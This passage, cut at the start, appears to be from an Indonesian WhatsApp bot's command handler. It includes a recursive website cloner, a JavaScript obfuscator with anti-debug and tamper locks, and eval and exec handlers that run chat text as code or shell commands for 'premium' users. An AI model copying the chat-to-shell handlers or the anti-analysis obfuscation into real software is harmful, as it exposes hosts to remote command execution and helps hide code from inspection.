            htmlType &&
            !path.extname(filename)
        ) {
            filename += ".html";
        }

        if (
            !path.extname(filename) &&
            contentType.includes("text/css")
        ) {
            filename += ".css";
        }

        if (
            !path.extname(filename) &&
            (
                contentType.includes("javascript") ||
                contentType.includes("ecmascript")
            )
        ) {
            filename += ".js";
        }

        if (
            u.search &&
            !path.extname(filename) &&
            htmlType
        ) {
            filename += ".html";
        }

        parts.push(filename);

        return parts.join("/") || "index.html";
    };

    const safePath = (relative) => {
        const root = path.resolve(saveDir);
        const target = path.resolve(
            saveDir,
            relative
        );

        if (
            target !== root &&
            !target.startsWith(root + path.sep)
        ) {
            return null;
        }

        return target;
    };

    const getRelativeLocalPath = (
        fromFile,
        targetFile
    ) => {
        let rel = path.relative(
            path.dirname(fromFile),
            targetFile
        );

        rel = rel.replace(/\\/g, "/");

        if (!rel.startsWith(".")) {
            rel = "./" + rel;
        }

        return rel;
    };

    const extractUrls = (
        content,
        currentUrl,
        contentType
    ) => {
        const refs = new Set();

        const addRef = (value) => {
            if (!value) return;

            value = String(value)
                .trim()
                .replace(/^["']|["']$/g, "");

            const normalized = normalizeUrl(
                value,
                currentUrl
            );

            if (
                normalized &&
                isAllowedUrl(normalized)
            ) {
                refs.add(normalized);
            }
        };

        const type = String(
            contentType || ""
        ).toLowerCase();

        if (
            type.includes("html") ||
            /\.html?($|\?)/i.test(currentUrl)
        ) {
            const $ = cheerio.load(
                content,
                {
                    decodeEntities: false
                }
            );

            $(
                "[href],[src],[poster],[action],[data-src],[data-href],[srcset],[data],[content]"
            ).each((_, el) => {
                const attrs = [
                    "href",
                    "src",
                    "poster",
                    "action",
                    "data-src",
                    "data-href",
                    "data"
                ];

                for (const attr of attrs) {
                    const value = $(el).attr(attr);

                    if (value) {
                        addRef(value);
                    }
                }

                const contentAttr =
                    $(el).attr("content");

                if (
                    contentAttr &&
                    /^https?:\/\//i.test(contentAttr)
                ) {
                    addRef(contentAttr);
                }

                const srcset =
                    $(el).attr("srcset");

                if (srcset) {
                    srcset
                        .split(",")
                        .forEach(item => {
                            const value = item
                                .trim()
                                .split(/\s+/)[0];

                            addRef(value);
                        });
                }
            });

            $("style").each((_, el) => {
                const css =
                    $(el).html() || "";

                for (const match of css.matchAll(
                    /url\(\s*(['"]?)(.*?)\1\s*\)/gi
                )) {
                    addRef(match[2]);
                }

                for (const match of css.matchAll(
                    /@import\s+(?:url\(\s*)?['"]([^'"]+)['"]\s*\)?/gi
                )) {
                    addRef(match[1]);
                }
            });

            $("script:not([src])").each((_, el) => {
                const js =
                    $(el).html() || "";

                for (const match of js.matchAll(
                    /(?:import|export)\s+(?:[^'"]*?\sfrom\s*)?['"]([^'"]+)['"]/g
                )) {
                    addRef(match[1]);
                }

                for (const match of js.matchAll(
                    /import\(\s*['"]([^'"]+)['"]\s*\)/g
                )) {
                    addRef(match[1]);
                }

                for (const match of js.matchAll(
                    /fetch\(\s*['"]([^'"]+)['"]/g
                )) {
                    addRef(match[1]);
                }

                for (const match of js.matchAll(
                    /axios\.(?:get|post|put|delete)\(\s*['"]([^'"]+)['"]/g
                )) {
                    addRef(match[1]);
                }
            });
        }

        if (
            type.includes("css") ||
            /\.css($|\?)/i.test(currentUrl)
        ) {
            for (const match of content.matchAll(
                /url\(\s*(['"]?)(.*?)\1\s*\)/gi
            )) {
                addRef(match[2]);
            }

            for (const match of content.matchAll(
                /@import\s+(?:url\(\s*)?['"]([^'"]+)['"]\s*\)?/gi
            )) {
                addRef(match[1]);
            }
        }

        if (
            type.includes("javascript") ||
            type.includes("ecmascript") ||
            /\.m?js($|\?)/i.test(currentUrl)
        ) {
            const patterns = [
                /(?:import|export)\s+(?:[^'"]*?\sfrom\s*)?['"]([^'"]+)['"]/g,
                /import\(\s*['"]([^'"]+)['"]\s*\)/g,
                /require\(\s*['"]([^'"]+)['"]\s*\)/g,
                /fetch\(\s*['"]([^'"]+)['"]/g,
                /axios\.(?:get|post|put|delete)\(\s*['"]([^'"]+)['"]/g
            ];

            for (const regex of patterns) {
                for (const match of content.matchAll(regex)) {
                    addRef(match[1]);
                }
            }
        }

        for (const match of content.matchAll(
            /(?:sourceMappingURL=|sourcemap\s*:\s*)["']?([^"'\s]+)/gi
        )) {
            addRef(match[1]);
        }

        return [...refs];
    };

    const detectText = (
        contentType,
        url
    ) => {
        const type =
            String(contentType || "")
                .toLowerCase();

        return (
            type.includes("text/") ||
            type.includes("javascript") ||
            type.includes("ecmascript") ||
            type.includes("json") ||
            type.includes("xml") ||
            type.includes("svg") ||
            type.includes("css")
        ) || /\.(html?|css|js|mjs|json|xml|svg|map)(\?|$)/i.test(url);
    };

    const fetchSitemap = async () => {
        const sitemapUrls = [
            new URL(
                "/sitemap.xml",
                baseUrl.origin
            ).href,
            new URL(
                "/sitemap_index.xml",
                baseUrl.origin
            ).href,
            new URL(
                "/robots.txt",
                baseUrl.origin
            ).href
        ];

        for (const sitemap of sitemapUrls) {
            try {
                const response =
                    await axios.get(
                        sitemap,
                        {
                            timeout: 15000,
                            responseType: "text",
                            maxContentLength:
                                10 * 1024 * 1024,
                            validateStatus:
                                status =>
                                    status >= 200 &&
                                    status < 400,
                            headers: {
                                "User-Agent":
                                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131 Safari/537.36",
                                Accept:
                                    "*/*"
                            }
                        }
                    );

                const urls = [
                    ...response.data.matchAll(
                        /<loc>\s*([^<]+)\s*<\/loc>/gi
                    )
                ];

                for (const match of urls) {
                    addQueue(
                        match[1]
                    );
                }

                if (
                    sitemap.endsWith(
                        "/robots.txt"
                    )
                ) {
                    for (const match of response.data.matchAll(
                        /Sitemap:\s*(.+)/gi
                    )) {
                        addQueue(
                            match[1].trim()
                        );
                    }
                }
            } catch {}
        }
    };

    const downloadOne = async (url) => {
        try {
            const response =
                await axios.get(
                    url,
                    {
                        responseType:
                            "arraybuffer",
                        timeout:
                            REQUEST_TIMEOUT,
                        maxContentLength:
                            MAX_FILE_SIZE,
                        maxBodyLength:
                            MAX_FILE_SIZE,
                        maxRedirects: 10,
                        validateStatus:
                            status =>
                                status >= 200 &&
                                status < 400,
                        headers: {
                            "User-Agent":
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131 Safari/537.36",
                            Accept:
                                "*/*",
                            "Accept-Language":
                                "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                            Referer:
                                baseUrl.href
                        }
                    }
                );

            const contentType =
                String(
                    response.headers[
                        "content-type"
                    ] || ""
                ).toLowerCase();

            const finalUrl =
                response.request?.res?.responseUrl ||
                url;

            const normalizedFinal =
                normalizeUrl(
                    finalUrl,
                    url
                ) || url;

            if (
                !isAllowedUrl(
                    normalizedFinal
                )
            ) {
                throw new Error(
                    "Redirect keluar domain"
                );
            }

            const localRelative =
                urlMap.get(
                    normalizedFinal
                ) ||
                getLocalPath(
                    normalizedFinal,
                    contentType
                );

            const filePath =
                safePath(
                    localRelative
                );

            if (!filePath) {
                throw new Error(
                    "Invalid local path"
                );
            }

            const buffer =
                Buffer.from(
                    response.data
                );

            if (
                buffer.length >
                MAX_FILE_SIZE
            ) {
                throw new Error(
                    "File terlalu besar"
                );
            }

            urlMap.set(
                normalizedFinal,
                localRelative
            );

            if (
                normalizedFinal !== url
            ) {
                urlMap.set(
                    url,
                    localRelative
                );
            }

            const isText =
                detectText(
                    contentType,
                    normalizedFinal
                );

            if (isText) {
                const content =
                    buffer.toString(
                        "utf8"
                    );

                const refs =
                    extractUrls(
                        content,
                        normalizedFinal,
                        contentType
                    );

                for (const ref of refs) {
                    addQueue(ref);

                    if (!urlMap.has(ref)) {
                        urlMap.set(
                            ref,
                            getLocalPath(
                                ref,
                                ""
                            )
                        );
                    }
                }

                contentMap.set(
                    normalizedFinal,
                    {
                        content,
                        contentType,
                        localRelative
                    }
                );
            } else {
                contentMap.set(
                    normalizedFinal,
                    {
                        buffer,
                        contentType,
                        localRelative
                    }
                );
            }

            return {
                success: true,
                url: normalizedFinal,
                contentType
            };
        } catch (err) {
            failed.set(
                url,
                err?.response?.status
                    ? `HTTP ${err.response.status}`
                    : err?.code || err?.message || "Unknown error"
            );

            return {
                success: false,
                url
            };
        }
    };

    try {
        await reyz.sendMessage(
            m.chat,
            {
                text:
                    `⏳ *Mengambil full source...*\n\n` +
                    `🌐 ${baseUrl.href}\n` +
                    `🔎 Domain: ${baseUrl.hostname}\n` +
                    `📦 Recursive crawler aktif`
            },
            { quoted: qR9X }
        );

        fs.rmSync(
            saveDir,
            {
                recursive: true,
                force: true
            }
        );

        if (fs.existsSync(zipPath)) {
            fs.unlinkSync(zipPath);
        }

        fs.mkdirSync(
            saveDir,
            {
                recursive: true
            }
        );

        addQueue(
            baseUrl.href
        );

        await fetchSitemap();

        while (
            queue.length > 0 &&
            visited.size < MAX_FILES
        ) {
            const batch = [];

            while (
                queue.length > 0 &&
                batch.length < 8 &&
                visited.size + batch.length < MAX_FILES
            ) {
                const current =
                    queue.shift();

                if (
                    !current ||
                    visited.has(current)
                ) {
                    continue;
                }

                visited.add(
                    current
                );

                batch.push(
                    current
                );
            }

            const results =
                await Promise.all(
                    batch.map(
                        downloadOne
                    )
                );

            for (const result of results) {
                if (result.success) {
                    berhasil++;

                    if (
                        result.contentType
                            .includes("text/html") ||
                        result.contentType
                            .includes("application/xhtml")
                    ) {
                        halaman++;
                    }
                } else {
                    gagal++;
                }
            }
        }

        for (const [
            currentUrl,
            item
        ] of contentMap.entries()) {
            const filePath =
                safePath(
                    item.localRelative
                );

            if (!filePath) continue;

            fs.mkdirSync(
                path.dirname(
                    filePath
                ),
                {
                    recursive: true
                }
            );

            if (item.content !== undefined) {
                let content =
                    item.content;

                const refs =
                    extractUrls(
                        content,
                        currentUrl,
                        item.contentType
                    );

                const replacements = [];

                for (const ref of refs) {
                    const local =
                        urlMap.get(ref);

                    if (!local) continue;

                    const target =
                        safePath(local);

                    if (!target) continue;

                    replacements.push({
                        ref,
                        replacement:
                            getRelativeLocalPath(
                                filePath,
                                target
                            )
                    });
                }

                replacements.sort(
                    (a, b) =>
                        b.ref.length -
                        a.ref.length
                );

                for (const item of replacements) {
                    const escaped =
                        item.ref.replace(
                            /[.*+?^${}()|[\]\\]/g,
                            "\\$&"
                        );

                    content =
                        content.replace(
                            new RegExp(
                                escaped,
                                "g"
                            ),
                            item.replacement
                        );
                }

                fs.writeFileSync(
                    filePath,
                    content,
                    "utf8"
                );
            } else {
                fs.writeFileSync(
                    filePath,
                    item.buffer
                );
            }
        }

        const indexPath =
            safePath(
                "index.html"
            );

        const rootIndex =
            safePath(
                urlMap.get(
                    baseUrl.href
                ) || "index.html"
            );

        if (
            rootIndex &&
            indexPath &&
            rootIndex !== indexPath &&
            fs.existsSync(rootIndex) &&
            !fs.existsSync(indexPath)
        ) {
            fs.copyFileSync(
                rootIndex,
                indexPath
            );
        }

        const zip =
            new AdmZip();

        zip.addLocalFolder(
            saveDir,
            folderName
        );

        zip.writeZip(
            zipPath
        );

        const buffer =
            fs.readFileSync(
                zipPath
            );

        await reyz.sendMessage(
            m.chat,
            {
                document: buffer,
                mimetype:
                    "application/zip",
                fileName:
                    `${folderName}.zip`,
                caption:
                    `📦 *Full Source Website*\n\n` +
                    `🌐 ${baseUrl.href}\n` +
                    `🌍 Domain: ${baseUrl.hostname}\n` +
                    `📁 File: ${berhasil}\n` +
                    `🌐 Halaman: ${halaman}\n` +
                    `❌ Gagal: ${gagal}\n` +
                    `🔎 Recursive: ON\n` +
                    `🌐 TLD: ALL\n` +
                    `🎨 HTML/CSS: ON\n` +
                    `⚡ JS: ON\n` +
                    `🖼️ Assets: ON\n` +
                    `🗺️ Sitemap: ON`
            },
            { quoted: qR9X }
        );

        fs.rmSync(
            saveDir,
            {
                recursive: true,
                force: true
            }
        );

        if (fs.existsSync(zipPath)) {
            fs.unlinkSync(zipPath);
        }

    } catch (err) {
        console.error(
            "SOURCE ERROR:",
            err
        );

        try {
            if (fs.existsSync(saveDir)) {
                fs.rmSync(
                    saveDir,
                    {
                        recursive: true,
                        force: true
                    }
                );
            }

            if (fs.existsSync(zipPath)) {
                fs.unlinkSync(zipPath);
            }
        } catch {}

        await reyz.sendMessage(
            m.chat,
            {
                text:
                    `❌ *Gagal mengambil source:*\n\n${err.message}`
            },
            { quoted: qR9X }
        );
    }
}
break;
case "enc": {
  if (!text) return reyz.sendMessage(m.chat, {
    text: `file js nya mana`
  }, { quoted: qR9X });
  const obfuscate = async (c) => {
  let cainis = ["高", "宝", "座", "高", "座", "我", "き", "强", "的"];
  function boikotcina() {
    const length = Math.floor(Math.random() * 4) + 3;
    let name = "R9X";
    for (let i = 0; i < length; i++) {
      name += cainis[Math.floor(Math.random() * cainis.length)];
    }
    return name;
  }
  let conf = {
    target: "node",
    hexadecimalNumbers: true,
    identifierGenerator: function () {
      return boikotcina() + "R9X" + boikotcina();
    },
    preserveFunctionLength: false,
    lock: {
      antiDebug: true,
      tamperProtection: true,
      selfDefending: true,
      integrity: true,
    },
    variableMasking: { value: true, limit: 30 },
    astScrambler: true,
    stringConcealing: true,
    stringEncoding: true,
    stringSplitting: { value: true, limit: 20 },
    renameVariables: true,
    renameGlobals: true,
    renameLabels: true,
    controlFlowFlattening: 0.75,
    flatten: true,
    dispatcher: true,
    opaquePredicates: 0.75,
    deadCode: 0.25,
    duplicateLiteralsRemoval: true,
    globalConcealing: true,
    objectExtraction: true,
    movedDeclarations: true,
    compact: true,
    debugComments: false
  };
  return await JsConfuser.obfuscate(c, conf);
 }

  try {
    const result = await obfuscate(text);

    await reyz.sendMessage(m.chat, {
      document: Buffer.from(result.code || result),
      mimetype: "application/javascript",
      fileName: "enc.js"
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    await reyz.sendMessage(m.chat, {
      text: `❌ Gagal melakukan obfuscate:\n${err.message}`
    }, { quoted: m });
  }
}
break;
// MAIN
      case "runtime":
      {
        let lowq = `*Telah Online Selama:*\n${runtime(
          process.uptime(),
        )}*`;
        reply(`${lowq}`);
      }
      break
//——————————[ And Case ]——————————\\
default:
if (budy.startsWith(']>')) {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return reply(bang)
    }
    try {
        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    try {
        let evaled = await eval(budy.slice(2));

        if (typeof evaled !== 'string') {
            evaled = util.inspect(evaled, { depth: 1 })
        }

        await reply(evaled);
    } catch (err) {
        reply(String(err));
    }
}

if (budy.startsWith('^')) {
    if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
    exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(`${err}`)
        if (stdout) return reply(stdout)
    })
}

}
} catch (err) {
  console.error(err)
}
}

let file = __filename;
if (!global._watchedCaseJs) {
  global._watchedCaseJs = true;
  fs.watchFile(file, () => {
    fs.unwatchFile(file);
    global._watchedCaseJs = false;
    console.log(chalk.redBright(`${file} berubah, bot akan reload command.js otomatis.`));
  });
}
